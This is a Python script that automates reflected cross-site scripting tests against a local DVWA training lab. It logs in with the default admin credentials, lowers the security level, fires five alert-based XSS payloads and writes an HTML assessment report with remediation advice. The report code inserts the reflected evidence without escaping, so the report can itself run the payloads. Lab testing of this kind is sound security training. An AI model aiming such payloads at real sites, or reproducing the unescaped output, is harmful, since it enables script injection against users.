import requests
from bs4 import BeautifulSoup
import time
from datetime import datetime
import urllib3
import html

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class DVWAXSSTester:
    def __init__(self):
        self.session = requests.Session()
        self.base_url = "http://localhost/dvwa"
        self.login_url = f"{self.base_url}/login.php"
        self.security_url = f"{self.base_url}/security.php"
        self.xss_url = f"{self.base_url}/vulnerabilities/xss_r/"
        self.payloads = [
            "<script>alert('XSS')</script>",
            "<img src=\"x\" onerror=\"alert('XSS')\">",
            "<svg/onload=alert('XSS')>",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "<a href=\"javascript:alert('XSS')\">click me</a>"
        ]
        self.results = []

    def login(self):
        print("[*] Logging into DVWA...")
        response = self.session.get(self.login_url)
        soup = BeautifulSoup(response.text, 'html.parser')
        user_token_elem = soup.find('input', {'name': 'user_token'})
        
        if not user_token_elem:
            raise Exception("Could not find user_token on login page")
            
        user_token = user_token_elem['value']
        
        login_data = {
            'username': 'admin',
            'password': 'password',
            'Login': 'Login',
            'user_token': user_token
        }
        
        self.session.post(self.login_url, data=login_data, verify=False)
        print("[+] Login successful")

    def set_security_level(self):
        print("[*] Setting security level to Low...")
        response = self.session.get(self.security_url)
        soup = BeautifulSoup(response.text, 'html.parser')
        user_token_elem = soup.find('input', {'name': 'user_token'})
        
        if not user_token_elem:
            raise Exception("Could not find user_token on security page")
            
        user_token = user_token_elem['value']
        
        security_data = {
            'security': 'low',
            'seclev_submit': 'Submit',
            'user_token': user_token
        }
        
        self.session.post(self.security_url, data=security_data, verify=False)
        print("[+] Security level set to Low")

    def test_payload(self, payload):
        print(f"[*] Testing payload: {payload}")
        
        # Prepare the parameters
        params = {
            'name': payload
        }
        
        # Try to add user_token if it exists
        response = self.session.get(self.xss_url)
        soup = BeautifulSoup(response.text, 'html.parser')
        user_token_elem = soup.find('input', {'name': 'user_token'})
        if user_token_elem:
            params['user_token'] = user_token_elem['value']
        
        # Submit the form via GET request
        response = self.session.get(self.xss_url, params=params, verify=False)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Check if payload is reflected in the response
        content_div = soup.find('div', {'class': 'vulnerable_code_area'})
        if content_div:
            content = str(content_div)
            reflected = payload in content
            
            # For encoded payloads, check if decoded version is present
            if not reflected and '%3C' in payload:
                try:
                    decoded_payload = requests.utils.unquote(payload)
                    reflected = decoded_payload in content
                except:
                    pass
            
            # Check for executable elements
            executable = any(tag in content.lower() for tag in [
                '<script', 'onerror', 'onload', 'javascript:', 'onclick'
            ])
            
            evidence = content[:300] + "..." if len(content) > 300 else content
            return {
                'payload': payload,
                'reflected': reflected,
                'executable': executable,
                'evidence': evidence
            }
        
        # If no vulnerable_code_area found, check the whole page
        content = str(soup)
        reflected = payload in content
        if not reflected and '%3C' in payload:
            try:
                decoded_payload = requests.utils.unquote(payload)
                reflected = decoded_payload in content
            except:
                pass
                
        executable = any(tag in content.lower() for tag in [
            '<script', 'onerror', 'onload', 'javascript:', 'onclick'
        ])
        
        evidence = content[:300] + "..." if len(content) > 300 else content
        return {
            'payload': payload,
            'reflected': reflected,
            'executable': executable,
            'evidence': evidence
        }

    def run_tests(self):
        print("[*] Starting XSS tests...")
        for payload in self.payloads:
            try:
                result = self.test_payload(payload)
                self.results.append(result)
            except Exception as e:
                print(f"[!] Error testing payload '{payload}': {str(e)}")
                self.results.append({
                    'payload': payload,
                    'reflected': False,
                    'executable': False,
                    'evidence': f'Error: {str(e)}'
                })
            time.sleep(0.5)  # Be nice to the server
        print("[+] All tests completed")

    def generate_html_report(self):
        print("[*] Generating HTML report...")
        html_content = f"""<!DOCTYPE html>
<html>
<head>
    <title>OWASP OSCP-Style Security Assessment Report</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            margin: 40px;
            background-color: #f5f5f5;
        }}
        .header {{
            background-color: #2c3e50;
            color: white;
            padding: 20px;
            text-align: center;
            border-radius: 5px;
        }}
        .section {{
            background-color: white;
            margin: 20px 0;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }}
        h1, h2, h3 {{
            color: #2c3e50;
        }}
        table {{
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }}
        th, td {{
            border: 1px solid #ddd;
            padding: 12px;
            text-align: left;
        }}
        th {{
            background-color: #3498db;
            color: white;
        }}
        tr:nth-child(even) {{
            background-color: #f2f2f2;
        }}
        .success {{
            color: #27ae60;
            font-weight: bold;
        }}
        .failure {{
            color: #e74c3c;
            font-weight: bold;
        }}
        .payload {{
            font-family: 'Courier New', monospace;
            background-color: #f8f9fa;
            padding: 2px 4px;
            border-radius: 3px;
        }}
        .evidence {{
            font-family: 'Courier New', monospace;
            background-color: #f8f9fa;
            padding: 10px;
            border-left: 3px solid #3498db;
            overflow-x: auto;
            max-height: 150px;
            overflow-y: auto;
            white-space: pre-wrap;
        }}
        .footer {{
            text-align: center;
            margin-top: 30px;
            color: #7f8c8d;
            font-size: 0.9em;
        }}
    </style>
</head>
<body>
    <div class="header">
        <h1>OWASP OSCP-Style Security Assessment Report</h1>
        <p><strong>Vulnerability:</strong> Reflected Cross-Site Scripting (OTG-INPVAL-001)</p>
        <p><strong>Target:</strong> {self.base_url}</p>
        <p><strong>Tested Level:</strong> Low</p>
        <p><strong>Author:</strong> Automated XSS Tester</p>
        <p><strong>Date:</strong> {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
    </div>

    <div class="section">
        <h2>1. Executive Summary</h2>
        <p>Reflected Cross-Site Scripting (XSS) is a type of vulnerability where an application includes unvalidated and unescaped user input in its output. This allows attackers to inject malicious scripts that are executed in the victim's browser.</p>
        <p><strong>Risk Level:</strong> <span class="failure">High</span></p>
        <p><strong>Summary:</strong> The application is vulnerable to Reflected XSS at Low security level. Unsanitized user input is directly reflected in the response, allowing script execution.</p>
    </div>

    <div class="section">
        <h2>2. Technical Details</h2>
        <p>The DVWA Reflected XSS module at Low security level does not implement any input validation or output encoding. When a user submits data through the input field, it is directly embedded into the HTML response without sanitization, making it vulnerable to script injection.</p>
    </div>

    <div class="section">
        <h2>3. Test Results</h2>
        <table>
            <tr>
                <th>Payload</th>
                <th>Reflected</th>
                <th>Executable</th>
                <th>Evidence Snippet</th>
            </tr>"""
        
        for result in self.results:
            status_reflected = '<span class="success">Yes</span>' if result['reflected'] else '<span class="failure">No</span>'
            status_executable = '<span class="success">Yes</span>' if result['executable'] else '<span class="failure">No</span>'
            
            # Escape HTML entities to display them as text instead of rendering them
            escaped_payload = html.escape(result['payload'])
            escaped_evidence = result['evidence']
            
            html_content += f"""
            <tr>
                <td><span class="payload">{escaped_payload}</span></td>
                <td>{status_reflected}</td>
                <td>{status_executable}</td>
                <td><div class="evidence">{escaped_evidence}</div></td>
            </tr>"""
        
        html_content += f"""
        </table>
    </div>

    <div class="section">
        <h2>4. Proof of Concept</h2>
        <p>The following URLs demonstrate the vulnerability:</p>
        <div class="evidence">
{html.escape(self.xss_url + '?name=<script>alert(\'XSS\')</script>')}
{html.escape(self.xss_url + '?name=<img src="x" onerror="alert(\'XSS\')">')}
{html.escape(self.xss_url + '?name=%3Cscript%3Ealert(\'XSS\')%3C/script%3E')}
        </div>
        <p>When these URLs are accessed, the payload is executed in the browser context, demonstrating the vulnerability.</p>
    </div>

    <div class="section">
        <h2>5. Impact</h2>
        <p>Successful exploitation of this vulnerability could allow an attacker to:</p>
        <ul>
            <li>Steal session cookies and hijack user sessions</li>
            <li>Perform actions on behalf of the victim</li>
            <li>Deface the application</li>
            <li>Redirect users to malicious sites</li>
            <li>Capture keystrokes and sensitive information</li>
        </ul>
    </div>

    <div class="section">
        <h2>6. Remediation Recommendations</h2>
        <p>To mitigate Reflected XSS vulnerabilities, the following measures should be implemented:</p>
        <ol>
            <li><strong>Input Validation:</strong> Validate all user inputs against a whitelist of acceptable values.</li>
            <li><strong>Output Encoding:</strong> Contextually encode data before rendering it in HTML, JavaScript, CSS, or URL contexts.</li>
            <li><strong>Content Security Policy (CSP):</strong> Implement a strong CSP to restrict the sources from which scripts can be loaded.</li>
            <li><strong>Use Secure Frameworks:</strong> Leverage frameworks that automatically escape output (e.g., React, Angular).</li>
            <li><strong>Regular Security Testing:</strong> Conduct regular code reviews and penetration testing.</li>
        </ol>
    </div>

    <div class="section">
        <h2>7. References</h2>
        <ul>
            <li><a href="https://owasp.org/www-community/attacks/xss/">OWASP Cross Site Scripting (XSS)</a></li>
            <li><a href="https://github.com/digininja/DVWA">Damn Vulnerable Web Application (DVWA)</a></li>
            <li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation</a></li>
            <li><a href="https://portswigger.net/web-security/cross-site-scripting">PortSwigger XSS Cheat Sheet</a></li>
        </ul>
    </div>

    <div class="footer">
        <p>Report generated by Automated DVWA XSS Tester | For educational purposes only</p>
    </div>
</body>
</html>"""

        with open("xss_reflected_low_report.html", "w", encoding="utf-8") as f:
            f.write(html_content)
        
        print("[+] Report generated: xss_reflected_low_report.html")

    def run(self):
        try:
            self.login()
            self.set_security_level()
            self.run_tests()
            self.generate_html_report()
        except Exception as e:
            print(f"[!] Error: {str(e)}")
            import traceback
            traceback.print_exc()

if __name__ == "__main__":
    tester = DVWAXSSTester()
    tester.run()